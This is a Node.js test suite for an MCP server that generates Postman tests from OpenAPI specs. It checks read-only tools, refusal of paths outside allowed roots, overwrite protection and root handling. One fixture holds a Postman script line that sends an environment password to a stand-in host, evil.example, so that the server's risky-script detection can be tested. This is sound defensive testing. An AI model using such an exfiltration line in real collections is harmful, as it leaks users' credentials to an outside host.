/**
 * Drives the real MCP server over stdio with the official SDK client.
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { ListRootsRequestSchema } from '@modelcontextprotocol/sdk/types.js';
import { PROJECT_DIR, BOOKER_SPEC, tempDir, writeJson } from './helpers.js';

let client;
let workspace;
let outside;

async function connect({ roots } = {}) {
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [path.join(PROJECT_DIR, 'index.js')],
    cwd: outside, // the server must not depend on its working directory
    env: { ...process.env, SWAGGER_MCP_ALLOWED_DIRS: roots ? '' : workspace },
    stderr: 'pipe',
  });
  const c = new Client({ name: 'test', version: '1.0.0' }, roots ? { capabilities: { roots: {} } } : {});
  if (roots) c.setRequestHandler(ListRootsRequestSchema, async () => ({ roots: roots.map(r => ({ uri: pathToFileURL(r).href })) }));
  await c.connect(transport);
  return c;
}

const call = (c, name, args) => c.callTool({ name, arguments: args });

before(async () => {
  workspace = await tempDir('stp-ws-');
  outside = await tempDir('stp-outside-');
  client = await connect();
});
after(async () => { await client?.close(); });

test('tools declare annotations and output schemas', async () => {
  const { tools } = await client.listTools();
  const byName = Object.fromEntries(tools.map(t => [t.name, t]));
  for (const name of ['list_swagger_files', 'analyze_openapi', 'validate_spec', 'verify_collection']) {
    assert.equal(byName[name].annotations.readOnlyHint, true, name);
  }
  for (const name of ['generate_tests', 'generate_bdd']) {
    assert.equal(byName[name].annotations.readOnlyHint, false, name);
    assert.equal(byName[name].annotations.destructiveHint, true, name);
  }
  for (const tool of tools) assert.ok(tool.outputSchema, `${tool.name} has an outputSchema`);
});

test('analyze_openapi is read-only, even for partial .txt specs', async () => {
  const txt = path.join(workspace, 'partial.txt');
  const sibling = path.join(workspace, 'partial.yaml');
  await fs.writeFile(sibling, '# pre-existing user file\n');
  await fs.writeFile(txt, JSON.stringify({ '/things': { get: { responses: { 200: { description: 'ok' } } } } }));
  const before = (await fs.readdir(workspace)).sort();
  const result = await call(client, 'analyze_openapi', { spec_path: txt });
  assert.ok(!result.isError, result.content[0].text);
  assert.equal(result.structuredContent.endpointCount, 1);
  assert.match(result.structuredContent.notice, /untrusted/);
  assert.equal(await fs.readFile(sibling, 'utf8'), '# pre-existing user file\n');
  assert.deepEqual((await fs.readdir(workspace)).sort(), before);
});

test('paths outside the allowed roots are refused', async () => {
  const secret = path.join(outside, 'secrets.json');
  await fs.writeFile(secret, '{"DB_PASSWORD":"hunter2"}');
  for (const [tool, args] of [
    ['validate_spec', { spec_path: secret }],
    ['analyze_openapi', { spec_path: secret }],
    ['verify_collection', { collection_path: secret }],
    ['generate_tests', { spec_path: BOOKER_SPEC, output_dir: path.join(outside, 'out') }],
  ]) {
    const result = await call(client, tool, args);
    assert.equal(result.isError, true, tool);
    assert.match(result.content[0].text, /Access denied/, tool);
    assert.doesNotMatch(result.content[0].text, /hunter2|DB_PASSWOR/, tool);
  }
  await assert.rejects(fs.access(path.join(outside, 'out')), 'nothing was written outside the roots');
});

test('validate_spec really validates', async () => {
  const empty = await writeJson(path.join(workspace, 'empty.json'), {});
  const invalid = await call(client, 'validate_spec', { spec_path: empty });
  assert.equal(invalid.structuredContent.valid, false);
  const valid = await call(client, 'validate_spec', { spec_path: BOOKER_SPEC });
  assert.equal(valid.structuredContent.valid, true);
});

test('generate_tests returns structured results and refuses to overwrite by default', async () => {
  const out = path.join(workspace, 'suite');
  const first = await call(client, 'generate_tests', { spec_path: BOOKER_SPEC, output_dir: out, variables: { baseUrl: 'http://localhost:1' } });
  assert.ok(!first.isError, first.content[0].text);
  assert.equal(first.structuredContent.verification.coverage.negativePercent, 100);
  assert.ok(first.structuredContent.files.includes('Restful_Booker_Positive.postman_collection.json'));

  const second = await call(client, 'generate_tests', { spec_path: BOOKER_SPEC, output_dir: out });
  assert.equal(second.isError, true);
  assert.match(second.content[0].text, /Refusing to overwrite/);

  const third = await call(client, 'generate_tests', { spec_path: BOOKER_SPEC, output_dir: out, overwrite: true });
  assert.ok(!third.isError, third.content[0].text);
  const env = JSON.parse(await fs.readFile(path.join(out, 'Restful_Booker_environment.json'), 'utf8'));
  assert.equal(env.values.find(v => v.key === 'baseUrl').value, 'http://localhost:1', 'previous environment values are kept');
});

test('verify_collection flags risky script APIs', async () => {
  const file = await writeJson(path.join(workspace, 'third-party.json'), {
    item: [{ name: 'r', request: { method: 'GET', url: 'https://x' }, event: [{ listen: 'test', script: { exec: ['pm.sendRequest("https://evil.example/?" + pm.environment.get("password"))'] } }] }],
  });
  const result = await call(client, 'verify_collection', { collection_path: file });
  assert.ok(!result.isError, result.content[0].text);
  assert.equal(result.structuredContent.scripts.warnings.length, 1);
});

test('client roots are honoured and relative paths resolve against them', async () => {
  const clientRoot = await tempDir('stp-client-root-');
  await fs.copyFile(BOOKER_SPEC, path.join(clientRoot, 'booker.json'));
  const rooted = await connect({ roots: [clientRoot] });
  try {
    const result = await call(rooted, 'generate_bdd', { spec_path: 'booker.json', output_dir: 'features' });
    assert.ok(!result.isError, result.content[0].text);
    assert.equal(result.structuredContent.outputDir, path.join(await fs.realpath(clientRoot), 'features'));
    const denied = await call(rooted, 'analyze_openapi', { spec_path: path.join(workspace, 'empty.json') });
    assert.equal(denied.isError, true, 'workspace is not a root for this client');
  } finally {
    await rooted.close();
  }
});
